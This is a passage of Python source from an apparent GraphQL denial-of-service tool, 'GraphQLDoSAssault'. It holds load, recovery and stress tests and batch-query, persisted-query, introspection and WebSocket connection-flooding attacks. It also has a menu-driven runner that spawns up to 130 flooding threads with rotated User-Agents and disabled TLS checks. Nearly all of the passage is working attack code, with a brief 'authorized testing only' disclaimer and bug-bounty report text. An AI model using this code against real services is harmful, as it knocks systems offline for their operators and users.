            print("   6. Add timeout protection")
        elif 'performance_degradation' in locals() and performance_degradation > 200:
            print("   1. 📊 ACTION RECOMMENDED")
            print("   2. Review query depth/complexity limits")
            print("   3. Implement moderate rate limiting")
            print("   4. Monitor for abnormal queries")
            print("   5. Consider query analysis")
        else:
            print("   1. ✅ Current protections appear adequate")
            print("   2. Continue monitoring performance")
            print("   3. Review logs for suspicious activity")
            print("   4. Consider proactive security measures")
        
        self.generate_assault_report()

    def quick_performance_test(self, endpoint):
        """Quick performance test"""
        print("\nQUICK PERFORMANCE TEST")
        
        print("\nMeasuring baseline performance...")
        baseline = self.measure_performance(endpoint, "baseline", 10)
        
        print("\nStarting concurrent load test...")
        self.stop_signal = False
        
        threads = []
        for i in range(20):
            t = threading.Thread(target=self.light_attack_worker, args=(endpoint,))
            t.daemon = True
            t.start()
            threads.append(t)
        
        time.sleep(10)
        
        print("\nMeasuring performance under load...")
        under_load = self.measure_performance(endpoint, "under_load", 10)
        
        self.stop_signal = True
        for t in threads:
            t.join(timeout=5)
        
        if 'avg_time' in baseline and 'avg_time' in under_load:
            degradation = (under_load['avg_time'] / baseline['avg_time']) * 100
            print(f"\nQuick Analysis:")
            print(f"   Baseline: {baseline['avg_time']:.3f}s")
            print(f"   Under Load: {under_load['avg_time']:.3f}s")
            print(f"   Performance: {degradation:.1f}% of baseline")
            print(f"   405 Errors: {under_load.get('error_405_rate', 0):.1f}%")
            
            if degradation > 500:
                print(f"   🚨 SIGNIFICANT DEGRADATION DETECTED")
                self.attack_results.append(f"Quick test: {degradation:.1f}% degradation")
            elif degradation > 200:
                print(f"   ⚠️  MODERATE DEGRADATION DETECTED")
                self.attack_results.append(f"Quick test: {degradation:.1f}% degradation")
        
        self.generate_assault_report()

    def load_tolerance_test(self, endpoint):
        """Test load tolerance"""
        print("\nLOAD TOLERANCE TEST")
        
        load_levels = [1, 5, 10, 20, 30, 50, 100, 200]
        results = []
        
        for load in load_levels:
            print(f"\nTesting {load} concurrent requests...")
            
            self.stop_signal = False
            threads = []
            
            for i in range(load):
                t = threading.Thread(target=self.simple_request_worker, args=(endpoint,))
                t.daemon = True
                t.start()
                threads.append(t)
            
            time.sleep(15)
            
            measurement = self.measure_performance(endpoint, f"{load}_concurrent", 5)
            
            self.stop_signal = True
            for t in threads:
                t.join(timeout=5)
            
            results.append((load, measurement))
            
            if 'avg_time' in measurement and measurement['avg_time'] > 10.0:
                print(f"    High latency at {load} concurrent - stopping test")
                break
            
            time.sleep(10)
        
        print(f"\n" + "=" * 80)
        print("LOAD TOLERANCE ANALYSIS")
        print("=" * 80)
        
        print(f"\n{'Load':<10} {'Avg Time':<12} {'Success %':<12} {'405 Errors %':<12} {'Status'}")
        print("-" * 80)
        
        for load, measurement in results:
            if 'avg_time' in measurement:
                avg = f"{measurement['avg_time']:.3f}s"
                success = f"{measurement.get('success_rate', 0):.1f}%"
                error_405 = f"{measurement.get('error_405_rate', 0):.1f}%"
                
                if measurement['avg_time'] > 10.0:
                    status = "🚨 FAILING"
                    self.attack_results.append(f"Load tolerance: {load} concurrent causes >10s latency")
                elif measurement['avg_time'] > 5.0:
                    status = "⚠️  DEGRADED"
                    self.attack_results.append(f"Load tolerance: {load} concurrent causes >5s latency")
                elif measurement.get('error_405_rate', 0) > 50:
                    status = "🚨 405 ERRORS"
                    self.attack_results.append(f"Load tolerance: {load} concurrent causes {error_405} 405 errors")
                else:
                    status = "✅ STABLE"
                
                print(f"{load:<10} {avg:<12} {success:<12} {error_405:<12} {status}")
        
        self.generate_assault_report()

    def simple_request_worker(self, endpoint):
        """Simple request worker for load testing"""
        while not self.stop_signal:
            self.active_attacks += 1
            try:
                payload = {"query": "{__typename}"}
                headers = {'User-Agent': random.choice(self.user_agents)}
                self.session.post(endpoint, json=payload, timeout=10, headers=headers, verify=False)
                self.success_count += 1
            except:
                self.fail_count += 1
            finally:
                self.active_attacks -= 1
            
            time.sleep(random.uniform(0.05, 0.2))

    def recovery_time_test(self, endpoint):
        """Test recovery time after attack"""
        print("\nRECOVERY TIME TEST")
        
        print("\nPhase 1: Baseline measurement...")
        baseline = self.measure_performance(endpoint, "baseline", 5)
        
        print("\nPhase 2: Heavy attack (60 seconds)...")
        self.stop_signal = False
        
        attack_threads = []
        for i in range(50):
            t = threading.Thread(target=self.heavy_attack_worker, args=(endpoint,))
            t.daemon = True
            t.start()
            attack_threads.append(t)
        
        attack_duration = 60
        for remaining in range(attack_duration, 0, -1):
            print(f"\rAttack running: {remaining:2d}s remaining", end="", flush=True)
            time.sleep(1)
        
        print("\n\nPhase 3: Stopping attack and measuring recovery...")
        self.stop_signal = True
        for t in attack_threads:
            t.join(timeout=5)
        
        recovery_intervals = [1, 5, 10, 30, 60, 120, 300]
        recovery_measurements = []
        
        for interval in recovery_intervals:
            print(f"\n  Measuring {interval}s after attack...")
            time.sleep(interval)
            
            measurement = self.measure_performance(endpoint, f"recovery_{interval}s", 5)
            recovery_measurements.append((interval, measurement))
        
        print(f"\n" + "=" * 80)
        print("RECOVERY ANALYSIS")
        print("=" * 80)
        
        if 'avg_time' in baseline:
            baseline_time = baseline['avg_time']
            print(f"\nBaseline response time: {baseline_time:.3f}s")
            print(f"Baseline 405 error rate: {baseline.get('error_405_rate', 0):.1f}%")
            
            print(f"\n{'Time After':<12} {'Response Time':<15} {'405 Errors %':<15} {'% of Baseline':<15} {'Status'}")
            print("-" * 80)
            
            for interval, measurement in recovery_measurements:
                if 'avg_time' in measurement:
                    current = measurement['avg_time']
                    error_405 = measurement.get('error_405_rate', 0)
                    percentage = (current / baseline_time) * 100
                    
                    if percentage <= 110 and error_405 <= 10:
                        status = "✅ RECOVERED"
                        self.attack_results.append(f"Recovery: {interval}s to normal")
                    elif percentage <= 150 and error_405 <= 30:
                        status = "⚠️  PARTIALLY RECOVERED"
                        self.attack_results.append(f"Recovery: {interval}s to {percentage:.1f}%")
                    else:
                        status = "🚨 STILL DEGRADED"
                        self.attack_results.append(f"Poor recovery: {interval}s at {percentage:.1f}%")
                    
                    print(f"{interval:<12}s {current:<15.3f}s {error_405:<15.1f}% {percentage:<15.1f}% {status}")
        
        self.generate_assault_report()

    def stress_test(self, endpoint):
        """Stress test"""
        print("\nSTRESS TEST")
        
        print("\nStarting stress test...")
        self.stop_signal = False
        
        # Start multiple attack types
        threads = []
        
        # 1. High volume requests
        for i in range(100):
            t = threading.Thread(target=self.stress_worker_high_volume, args=(endpoint,))
            t.daemon = True
            t.start()
            threads.append(t)
        
        # 2. Complex queries
        for i in range(20):
            t = threading.Thread(target=self.stress_worker_complex, args=(endpoint,))
            t.daemon = True
            t.start()
            threads.append(t)
        
        # 3. Large payloads
        for i in range(10):
            t = threading.Thread(target=self.stress_worker_large, args=(endpoint,))
            t.daemon = True
            t.start()
            threads.append(t)
        
        # Run for 5 minutes
        duration = 300
        start_time = time.time()
        
        while time.time() - start_time < duration and not self.stop_signal:
            elapsed = int(time.time() - start_time)
            remaining = duration - elapsed
            
            stats = f"Time: {remaining:3d}s | Active: {self.active_attacks:3d} | "
            stats += f"Success: {self.success_count:6d} | Fails: {self.fail_count:6d} | "
            stats += f"405 Errors: {self.rate_limit_count}"
            
            print(f"\r{stats}", end="", flush=True)
            time.sleep(1)
        
        self.stop_signal = True
        time.sleep(5)
        
        print("\n\nStress test complete.")
        self.generate_assault_report()

    def stress_worker_high_volume(self, endpoint):
        """High volume stress worker"""
        while not self.stop_signal:
            self.active_attacks += 1
            try:
                payload = {"query": "{__typename}"}
                headers = {'User-Agent': random.choice(self.user_agents)}
                self.session.post(endpoint, json=payload, timeout=2, headers=headers, verify=False)
                self.success_count += 1
            except:
                self.fail_count += 1
            finally:
                self.active_attacks -= 1
            
            time.sleep(random.uniform(0.001, 0.01))

    def stress_worker_complex(self, endpoint):
        """Complex query stress worker"""
        payloads = self.generate_aggressive_payloads(10)
        
        while not self.stop_signal:
            self.active_attacks += 1
            try:
                payload = random.choice(payloads)
                headers = {'User-Agent': random.choice(self.user_agents)}
                self.session.post(endpoint, json=payload, timeout=10, headers=headers, verify=False)
                self.success_count += 1
            except:
                self.fail_count += 1
            finally:
                self.active_attacks -= 1
            
            time.sleep(random.uniform(0.1, 0.5))

    def stress_worker_large(self, endpoint):
        """Large payload stress worker"""
        while not self.stop_signal:
            self.active_attacks += 1
            try:
                # Create large query
                query = "{"
                for i in range(1000):
                    query += f"field{i}: __typename "
                query += "}"
                
                payload = {"query": query}
                headers = {'User-Agent': random.choice(self.user_agents)}
                self.session.post(endpoint, json=payload, timeout=15, headers=headers, verify=False)
                self.success_count += 1
            except:
                self.fail_count += 1
            finally:
                self.active_attacks -= 1
            
            time.sleep(random.uniform(1.0, 3.0))

    # =================================================================
    # NEW ATTACK METHODS
    # =================================================================

    def websocket_attack(self):
        """WebSocket attack"""
        print("\n" + "=" * 80)
        print("WEBSOCKET ATTACK")
        print("=" * 80)
        
        print("\nTesting WebSocket GraphQL endpoints...")
        
        # Try to find WebSocket endpoints
        parsed = urlparse(self.base_target)
        hostname = parsed.hostname
        
        ws_endpoints = [
            f"wss://{hostname}/graphql",
            f"wss://{hostname}/subscriptions",
            f"wss://{hostname}/graphql/ws",
            f"wss://{hostname}/graphql/subscriptions",
            f"wss://{hostname}/subscriptions/ws",
            f"ws://{hostname}/graphql",
            f"ws://{hostname}/subscriptions",
        ]
        
        for ws_url in ws_endpoints:
            print(f"\n  Testing {ws_url}...")
            
            try:
                import websocket
                ws = websocket.WebSocket()
                ws.connect(ws_url, timeout=5)
                
                # Send GraphQL over WebSocket initialization
                init_msg = json.dumps({
                    "type": "connection_init",
                    "payload": {}
                })
                ws.send(init_msg)
                
                # Receive ack
                response = ws.recv()
                print(f"    Init response: {response[:100]}")
                
                # Send subscription
                sub_msg = json.dumps({
                    "id": "1",
                    "type": "start",
                    "payload": {
                        "query": "subscription { __typename }"
                    }
                })
                ws.send(sub_msg)
                
                response = ws.recv()
                print(f"    Subscription response: {response[:100]}")
                
                ws.close()
                print(f"    ✓ WebSocket connection successful!")
                
                # Try to attack via WebSocket
                self.websocket_dos_attack(ws_url)
                return
                
            except ImportError:
                print("    websocket-client package not installed.")
                print("    Install with: pip install websocket-client")
                return
            except Exception as e:
                print(f"    Error: {str(e)[:50]}")
        
        print("\nNo WebSocket GraphQL endpoints found.")

    def websocket_dos_attack(self, ws_url):
        """DoS attack via WebSocket"""
        print("\nAttempting WebSocket DoS attack...")
        
        try:
            import websocket
            
            # Create many WebSocket connections
            connections = []
            for i in range(50):
                try:
                    ws = websocket.WebSocket()
                    ws.connect(ws_url, timeout=10)
                    
                    # Send init
                    init_msg = json.dumps({
                        "type": "connection_init",
                        "payload": {}
                    })
                    ws.send(init_msg)
                    
                    connections.append(ws)
                    print(f"  Connection {i+1} established")
                    
                except:
                    break
            
            # Send subscription on all connections
            for i, ws in enumerate(connections):
                try:
                    sub_msg = json.dumps({
                        "id": str(i),
                        "type": "start",
                        "payload": {
                            "query": "subscription { __typename }"
                        }
                    })
                    ws.send(sub_msg)
                except:
                    pass
            
            # Hold connections open
            print(f"\nHolding {len(connections)} WebSocket connections open...")
            time.sleep(30)
            
            # Close connections
            for ws in connections:
                try:
                    ws.close()
                except:
                    pass
            
            print(f"WebSocket attack completed.")
            
        except Exception as e:
            print(f"WebSocket attack error: {e}")

    def batch_attack(self):
        """Batch query attack"""
        print("\n" + "=" * 80)
        print("BATCH QUERY ATTACK")
        print("=" * 80)
        
        # Find working endpoint
        if not self.working_endpoints:
            print("Finding working endpoint...")
            self.advanced_reconnaissance_phase()
            if not self.working_endpoints:
                print("No endpoints found. Aborting.")
                return
        
        endpoint = self.working_endpoints[0]['endpoint']
        print(f"Target: {endpoint}")
        
        print("\nTesting batch query vulnerabilities...")
        
        # Test batch sizes
        batch_sizes = [2, 5, 10, 20, 50, 100, 200, 500]
        
        for size in batch_sizes:
            print(f"\n  Testing batch of {size} queries...")
            
            # Create batch
            batch = []
            for i in range(size):
                batch.append({
                    "query": f"query BatchQuery{i} {{ __typename " + 
                            " ".join([f"field{j}: __typename" for j in range(20)]) + 
                            " }"
                })
            
            try:
                headers = {'User-Agent': random.choice(self.user_agents)}
                start = time.time()
                response = self.session.post(endpoint, json=batch, timeout=60, headers=headers, verify=False)
                elapsed = time.time() - start
                
                if response.status_code == 200:
                    data = response.json()
                    if isinstance(data, list):
                        print(f"    {size} batch queries accepted ({elapsed:.2f}s)")
                        self.attack_results.append(f"Batch {size} queries: {elapsed:.2f}s")
                        
                        if elapsed > 30.0:
                            print(f"    ⚠️  Significant slowdown")
                            self.attack_results.append(f"Batch slowdown at {size} queries")
                    else:
                        print(f"    Batch not supported")
                        break
                elif response.status_code == 400 or response.status_code == 413:
                    print(f"    Batch queries blocked: HTTP {response.status_code}")
                    self.attack_results.append(f"Batch blocked at {size}: HTTP {response.status_code}")
                    break
                else:
                    print(f"    HTTP {response.status_code}")
                    
            except requests.exceptions.Timeout:
                print(f"    ⏱️  TIMEOUT with batch queries!")
                self.attack_results.append(f"Batch timeout at {size} queries")
                break
            except Exception as e:
                print(f"    Error: {str(e)[:50]}")
        
        self.generate_assault_report()

    def persisted_query_attack(self):
        """Persisted query attack"""
        print("\n" + "=" * 80)
        print("PERSISTED QUERY ATTACK")
        print("=" * 80)
        
        print("\nAttempting persisted query attacks...")
        
        # Find working endpoint
        if not self.working_endpoints:
            print("Finding working endpoint...")
            self.advanced_reconnaissance_phase()
            if not self.working_endpoints:
                print("No endpoints found. Aborting.")
                return
        
        endpoint = self.working_endpoints[0]['endpoint']
        
        # Test different persisted query formats
        test_cases = [
            # Invalid hash
            {
                "extensions": {
                    "persistedQuery": {
                        "version": 1,
                        "sha256Hash": "0000000000000000000000000000000000000000000000000000000000000000"
                    }
                }
            },
            # Malformed hash
            {
                "extensions": {
                    "persistedQuery": {
                        "version": 1,
                        "sha256Hash": "invalid"
                    }
                }
            },
            # Very long hash
            {
                "extensions": {
                    "persistedQuery": {
                        "version": 1,
                        "sha256Hash": "x" * 1000
                    }
                }
            },
            # Negative version
            {
                "extensions": {
                    "persistedQuery": {
                        "version": -1,
                        "sha256Hash": "ecf4edb46db40b5132295c0291d62fb65d6759a9eedfa4d5d612dd5ec54a6b38"
                    }
                }
            },
            # Large version
            {
                "extensions": {
                    "persistedQuery": {
                        "version": 999999999,
                        "sha256Hash": "ecf4edb46db40b5132295c0291d62fb65d6759a9eedfa4d5d612dd5ec54a6b38"
                    }
                }
            },
        ]
        
        for i, test_case in enumerate(test_cases, 1):
            print(f"\n  Test case {i}...")
            
            try:
                headers = {'User-Agent': random.choice(self.user_agents)}
                response = self.session.post(endpoint, json=test_case, timeout=10, headers=headers, verify=False)
                
                print(f"    HTTP {response.status_code}")
                
                if response.status_code == 200:
                    data = response.json()
                    if 'errors' in data:
                        for error in data['errors']:
                            if 'persisted' in str(error).lower():
                                print(f"    Persisted query error: {str(error)[:80]}")
                                self.attack_results.append("Persisted queries enabled")
                    else:
                        print(f"    ⚠️  Persisted query accepted (potential issue)")
                        self.attack_results.append("Persisted query accepted with invalid hash")
                        
            except Exception as e:
                print(f"    Error: {str(e)[:50]}")
        
        self.generate_assault_report()

    def schema_introspection_attack(self):
        """Schema introspection attack"""
        print("\n" + "=" * 80)
        print("SCHEMA INTROSPECTION ATTACK")
        print("=" * 80)
        
        # Find working endpoint
        if not self.working_endpoints:
            print("Finding working endpoint...")
            self.advanced_reconnaissance_phase()
            if not self.working_endpoints:
                print("No endpoints found. Aborting.")
                return
        
        endpoint = self.working_endpoints[0]['endpoint']
        
        print("\nAttempting to extract GraphQL schema...")
        
        # Try different introspection queries
        introspection_queries = [
            # Full introspection
            self.generate_introspection_query(),
            
            # Minimal introspection
            """
            query {
              __schema {
                queryType { name }
                mutationType { name }
                subscriptionType { name }
              }
            }
            """,
            
            # Type query
            """
            query {
              __type(name: "Query") {
                name
                fields {
                  name
                  type {
                    name
                  }
                }
              }
            }
            """,
            
            # Directives query
            """
            query {
              __schema {
                directives {
                  name
                  locations
                }
              }
            }
            """,
        ]
        
        for i, query in enumerate(introspection_queries, 1):
            print(f"\n  Test {i}...")
            
            try:
                payload = {"query": query}
                headers = {'User-Agent': random.choice(self.user_agents)}
                start = time.time()
                response = self.session.post(endpoint, json=payload, timeout=30, headers=headers, verify=False)
                elapsed = time.time() - start
                
                if response.status_code == 200:
                    data = response.json()
                    if 'data' in data and data['data']:
                        print(f"    Introspection successful ({elapsed:.2f}s)")
                        self.attack_results.append(f"Introspection test {i}: {elapsed:.2f}s")
                        
                        # Extract useful info
                        if '__schema' in str(data):
                            print(f"    Schema information exposed")
                            self.attack_results.append("Schema information exposed")
                    else:
                        print(f"    Introspection disabled")
                else:
                    print(f"    HTTP {response.status_code}")
                    
            except Exception as e:
                print(f"    Error: {str(e)[:50]}")
        
        self.generate_assault_report()

    def subscription_attack(self):
        """Subscription attack"""
        print("\n" + "=" * 80)
        print("SUBSCRIPTION ATTACK")
        print("=" * 80)
        
        print("\nTesting GraphQL subscriptions...")
        
        # Try to find subscription endpoint
        subscription_endpoints = [
            f"{self.base_target}/graphql",
            f"{self.base_target}/subscriptions",
            f"{self.base_target}/graphql/subscriptions",
            f"{self.base_target}/ws",
        ]
        
        for endpoint in subscription_endpoints:
            print(f"\n  Testing {endpoint}...")
            
            # Try subscription query
            subscription_query = """
            subscription {
              __typename
            }
            """
            
            try:
                payload = {"query": subscription_query}
                headers = {'User-Agent': random.choice(self.user_agents)}
                response = self.session.post(endpoint, json=payload, timeout=10, headers=headers, verify=False)
                
                if response.status_code == 200:
                    data = response.json()
                    if 'data' in data or 'errors' in data:
                        print(f"    Subscription endpoint found")
                        self.attack_results.append("Subscription endpoint found")
                        
                        # Check for subscription-specific errors
                        if 'errors' in data:
                            for error in data['errors']:
                                if 'subscription' in str(error).lower():
                                    print(f"    Subscription error: {str(error)[:80]}")
                        else:
                            print(f"    ⚠️  Subscription accepted")
                    else:
                        print(f"    Not a subscription endpoint")
                else:
                    print(f"    HTTP {response.status_code}")
                    
            except Exception as e:
                print(f"    Error: {str(e)[:50]}")
        
        self.generate_assault_report()

    def dns_rebinding_attack(self):
        """DNS rebinding attack"""
        print("\n" + "=" * 80)
        print("DNS REBINDING ATTACK")
        print("=" * 80)
        
        print("\nThis attack requires DNS configuration.")
        print("It attempts to bypass origin restrictions via DNS rebinding.")
        print("\nWARNING: This is an advanced attack that requires setup.")
        
        confirm = input("\nContinue? (y/N): ").strip().lower()
        if confirm != 'y':
            return
        
        print("\nDNS rebinding attack concepts:")
        print("1. Use a domain with very short TTL")
        print("2. Initially resolve to attacker-controlled IP")
        print("3. After connection, change DNS to target IP")
        print("4. Bypass same-origin policy")
        print("\nImplementation requires:")
        print("• Control over DNS server")
        print("• Domain with short TTL")
        print("• JavaScript execution context")
        
        self.attack_results.append("DNS rebinding attack discussed")
        self.generate_assault_report()

    def full_comprehensive_attack(self):
        """Full comprehensive attack"""
        print("\n" + "=" * 80)
        print("FULL COMPREHENSIVE ATTACK")
        print("=" * 80)
        
        print("\nExecuting all attack techniques...")
        
        # 1. Reconnaissance
        print("\n[1/10] Reconnaissance...")
        self.advanced_reconnaissance_phase()
        
        if not self.working_endpoints:
            print("No endpoints found. Aborting.")
            return
        
        endpoint = self.working_endpoints[0]['endpoint']
        
        # 2. 405 Bypass
        print("\n[2/10] 405 Bypass...")
        self.advanced_405_bypass()
        
        # 3. Precision strikes
        print("\n[3/10] Precision Strikes...")
        self.execute_all_precision_attacks(endpoint)
        
        # 4. Quick performance test
        print("\n[4/10] Performance Test...")
        self.quick_performance_test(endpoint)
        
        # 5. Load tolerance
        print("\n[5/10] Load Tolerance...")
        self.load_tolerance_test(endpoint)
        
        # 6. Lightning strike
        print("\n[6/10] Lightning Strike...")
        self.lightning_strike()
        
        # 7. Vortex attack
        print("\n[7/10] Vortex Attack...")
        self.vortex_attack()
        
        # 8. Batch attack
        print("\n[8/10] Batch Attack...")
        self.batch_attack()
        
        # 9. Schema introspection
        print("\n[9/10] Schema Introspection...")
        self.schema_introspection_attack()
        
        # 10. Impact assessment
        print("\n[10/10] Final Impact Assessment...")
        self.complete_impact_analysis(endpoint)
        
        print("\n" + "=" * 80)
        print("COMPREHENSIVE ATTACK COMPLETE")
        print("=" * 80)

    def attack_monitor(self):
        """Monitor attack progress"""
        start_time = time.time()
        
        while not self.stop_signal:
            elapsed = time.time() - start_time
            time.sleep(1)

    def generate_assault_report(self):
        """Generate detailed assault report"""
        print("\n" + "=" * 80)
        print("DoS ASSAULT REPORT")
        print("=" * 80)
        
        print(f"\nTarget: {self.target_url}")
        print(f"Base Target: {self.base_target}")
        print(f"Test Time: {time.strftime('%Y-%m-%d %H:%M:%S')}")
        
        print(f"\nRequest Statistics:")
        print(f"  Total requests attempted: {self.success_count + self.fail_count + self.timeout_count}")
        print(f"  Successful: {self.success_count}")
        print(f"  Failed: {self.fail_count}")
        print(f"  Timeouts: {self.timeout_count}")
        print(f"  Rate limits triggered: {self.rate_limit_count}")
        
        if self.working_endpoints:
            print(f"\nWorking Endpoints Found: {len(self.working_endpoints)}")
            for i, endpoint in enumerate(self.working_endpoints[:5], 1):
                print(f"  {i}. {endpoint['endpoint']} ({endpoint['method']})")
            if len(self.working_endpoints) > 5:
                print(f"  ... and {len(self.working_endpoints) - 5} more")
        
        if self.attack_results:
            print(f"\nATTACK RESULTS:")
            unique_results = set(self.attack_results)
            for result in sorted(list(unique_results))[:20]:
                print(f"  • {result}")
            
            if len(unique_results) > 0:
                print(f"\n🚨 DoS VULNERABILITY INDICATORS FOUND!")
                print(f"\nBUG BOUNTY SUBMISSION CHECKLIST:")
                print(f"  Target: {self.target_url}")
                print(f"  Vulnerability: GraphQL-based Denial of Service")
                print(f"  Impact: Service disruption (resource exhaustion)")
                print(f"  Evidence: {len(unique_results)} impact indicators")
                print(f"  Reproduction: Use assault vectors demonstrated")
                print(f"  CVSS Score: 7.5-9.0 (High-Critical)")
            else:
                print(f"\n✅ NO SIGNIFICANT IMPACT DETECTED")
                print(f"   Target appears to have robust GraphQL protections")
        else:
            print(f"\n📊 NO TEST RESULTS RECORDED")
            print(f"   Run an attack first to generate results")
        
        print(f"\n" + "=" * 80)
        print("SECURITY DISCLAIMER:")
        print("This tool is for AUTHORIZED security testing only.")
        print("Unauthorized use against systems you don't own is ILLEGAL.")
        print("Always obtain proper authorization before testing.")
        print("Follow responsible disclosure practices.")
        print("The author is not responsible for misuse of this tool.")
        print("=" * 80)
        
        # Save report to file
        self.save_report_to_file()

    def save_report_to_file(self):
        """Save report to file"""
        timestamp = time.strftime("%Y%m%d_%H%M%S")
        filename = f"graphql_dos_report_{timestamp}.txt"
        
        try:
            with open(filename, 'w') as f:
                f.write("=" * 80 + "\n")
                f.write("GRAPHQL DoS ASSESSMENT REPORT\n")
                f.write("=" * 80 + "\n\n")
                
                f.write(f"Target: {self.target_url}\n")
                f.write(f"Base Target: {self.base_target}\n")
                f.write(f"Test Time: {time.strftime('%Y-%m-%d %H:%M:%S')}\n\n")
                
                f.write("Request Statistics:\n")
                f.write(f"  Total requests attempted: {self.success_count + self.fail_count + self.timeout_count}\n")
                f.write(f"  Successful: {self.success_count}\n")
                f.write(f"  Failed: {self.fail_count}\n")
                f.write(f"  Timeouts: {self.timeout_count}\n")
                f.write(f"  Rate limits triggered: {self.rate_limit_count}\n\n")
                
                if self.attack_results:
                    f.write("Attack Results:\n")
                    unique_results = set(self.attack_results)
                    for result in sorted(list(unique_results)):
                        f.write(f"  • {result}\n")
                
                f.write("\n" + "=" * 80 + "\n")
                f.write("END OF REPORT\n")
                f.write("=" * 80 + "\n")
            
            print(f"\nReport saved to: {filename}")
            
        except Exception as e:
            print(f"Error saving report: {e}")

# =====================================================================
# MAIN EXECUTION
# =====================================================================

if __name__ == "__main__":
    print("\n" + "=" * 80)
    print("GRAPHQL DoS ASSESSMENT TOOL v3.0")
    print("=" * 80)
    print("Advanced tool for assessing GraphQL endpoint resilience")
    print("Includes 405 error bypass techniques and comprehensive testing")
    print("\nWARNING: For authorized security testing only!")
    print("=" * 80)
    
    # Disable SSL warnings for testing
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    
    assault = GraphQLDoSAssault()
    
    try:
        while True:
            assault.start_assault_console()
            again = input("\nStart new test session? (y/N): ").strip().lower()
            if again != 'y':
                print("\nThank you for using GraphQL DoS Assessment Tool.")
                print("Remember to always test responsibly!")
                break
            
            # Reset for next test
            assault.attack_results = []
            assault.success_count = 0
            assault.fail_count = 0
            assault.timeout_count = 0
            assault.rate_limit_count = 0
            assault.stop_signal = False
            assault.working_endpoints = []
            assault.active_attacks = 0
            
    except KeyboardInterrupt:
        print("\n\nTest terminated by user.")
    except Exception as e:
        print(f"\nUnexpected error: {str(e)}")
        import traceback
        traceback.print_exc()
